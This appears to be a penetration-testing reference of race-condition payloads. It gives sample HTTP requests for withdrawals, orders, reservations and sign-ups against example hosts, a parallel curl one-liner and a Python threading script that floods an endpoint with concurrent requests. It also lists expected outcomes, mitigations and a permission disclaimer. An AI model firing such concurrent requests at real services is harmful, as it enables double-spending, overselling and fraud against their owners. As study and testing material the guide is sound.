# Race Condition Payload Examples

This document provides example payloads and scenarios for testing race conditions in web applications.

## Basic Race Condition Payload

### Concurrent Balance Deduction (Financial System)

**Scenario**: Multiple simultaneous requests to deduct from the same account balance.

```json
POST /api/accounts/123/withdraw HTTP/1.1
Host: bank.example.com
Content-Type: application/json
Authorization: Bearer user_token_here

{
  "amount": 100,
  "currency": "USD",
  "transaction_id": "txn_987654321"
}
```

### Concurrent Inventory Reduction (E-commerce)

**Scenario**: Multiple orders trying to claim the last item in stock.

```json
POST /api/products/456/order HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{
  "user_id": "user_789",
  "quantity": 1,
  "payment_token": "pay_123456789"
}
```

## Race Condition Testing Techniques

### 1. Parallel Request Payload

Use tools like `curl`, `Postman`, or scripts to send simultaneous requests:

```bash
# Using GNU parallel to send 10 concurrent requests
seq 10 | parallel -n0 "curl -X POST https://api.example.com/checkout \
  -H 'Content-Type: application/json' \
  -d '{\"user_id\":\"user123\",\"item_id\":\"limited_edition_1\"}'"
```

### 2. Ticket Reservation Race

**Scenario**: Multiple users trying to reserve the same event ticket.

```json
POST /api/events/789/reserve HTTP/1.1
Host: tickets.example.com

{
  "user_id": "user_456",
  "seat_number": "A12",
  "payment_method": "credit_card"
}
```

## Race Condition in User Registration

### Duplicate Account Creation

```json
POST /api/register HTTP/1.1
Host: auth.example.com
Content-Type: application/json

{
  "email": "newuser@example.com",
  "password": "P@ssw0rd123",
  "username": "newuser123"
}
```

## Mitigation Headers (For Testing)

Some systems implement race condition protection headers:

```http
If-Unmodified-Since: Wed, 21 Oct 2023 07:28:00 GMT
If-Match: "etag_value_here"
```

## Expected Race Condition Outcomes

1. **Negative Balance/Inventory**: When checks pass for multiple requests before any updates
2. **Duplicate Entries**: When unique constraints aren't properly enforced
3. **Partial Updates**: When some but not all operations complete
4. **Inconsistent State**: When related data becomes out of sync

## Testing Script Example (Python)

```python
import threading
import requests

def make_request():
    response = requests.post(
        "https://api.example.com/checkout",
        json={"user_id": "user123", "item_id": "limited_item"},
        headers={"Authorization": "Bearer token123"}
    )
    print(response.status_code, response.json())

threads = []
for i in range(20):
    t = threading.Thread(target=make_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

## Protection Mechanisms to Test Against

1. **Database Locks** (Pessimistic/Optimistic)
2. **Atomic Operations**
3. **Queue Systems**
4. **ETag/Version Checking**
5. **Rate Limiting**

## Important Notes

1. Only test race conditions on systems you own or have permission to test
2. These examples are for educational and legitimate testing purposes
3. Actual exploitation of race conditions without permission is illegal
4. Always document your findings responsibly if conducting security research